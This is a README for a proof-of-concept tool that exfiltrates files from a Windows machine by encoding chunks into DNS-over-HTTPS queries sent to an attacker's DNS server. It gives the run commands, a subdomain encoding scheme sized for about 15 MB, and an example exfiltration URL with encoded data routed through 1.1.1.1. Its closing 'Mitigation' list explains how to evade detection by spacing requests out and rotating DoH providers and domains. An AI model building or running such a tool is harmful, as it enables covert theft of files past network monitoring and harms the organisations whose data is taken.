# DoH-Fetch
Simple proof of concept project to exfiltrate files via DoH

# Usage
```bash
# server
sudo systemctl stop systemd-resolved.service
sudo python3 dnspad.py
# files are stored in directory: files/<date>_combined.bin
```
```powershell
# client
.\fetch.exe -f '.\Desktop\test.xlsx'
```
# Architecture
Client (C#) - fetch.exe - ran on the Windows machine
1. Disassemble file for chunks
2. Create HTTPS requests with DNS query inside with chunks 

Server (Python) - dnspad.py  - ran on the Linux server machine (public IP + domain)
0. Stop services running on port 53 (internet access)
1. Run DNS server on port 53
2. While getting DNS queries assemble chunks into a file

# RFC limitations
* Label / subdomain:  `63` characters maximum
* Full Domain: `255` characters maximum
* Total URL: `2,000` characters maximum 

# My protocol design
My limits: `a.abcdefghi.com` which is `15` chars 

File integrity ? chunk identification number

2 bytes for ID, how many maximum ID's ?
255 * 255 = 65,025 

`possibleID` * `databytes` = maximum file size (in bytes)
`65,025` * `228` = 14,825,700 -> around 15MB

<42data>.<62data>.<62data>.<62data>.<2id>.a.chromalin.com

42 + 186 + 2 + 1 +  9 + 3 = 243

'.' also counting -> 7 above

Total: `250` where `228` is data 

simple test.xslx excel file: `8.27` KB -> 8270 / 228 = 36.3, meaning `37` requests

# IOC
A LOT of http/https traffic in small period of time: https://1.1.1.1/dns-query?name=google.com

Example http uri:
`https://1.1.1.1/dns-query?name=5353534141410D0A73757065725365637265743132.32330D0A31323865736764736739347766696F617373646773646766383932.317220736673616B6C3871723933333238666A61736C660D0A535353414141.0D0A402324255E262A28295F6B3B616C666D706F65662065770D0A53535341.0000.a.abcdefghi.com`


Mitigation: avoid generating a pattern
0. use randomized IP as a DNS response
1. limit the number 253
2. try prolong, 5 request in 5 hours
3. use different DoH services and methods (POST requests, not only GET)
4. use different domains for server
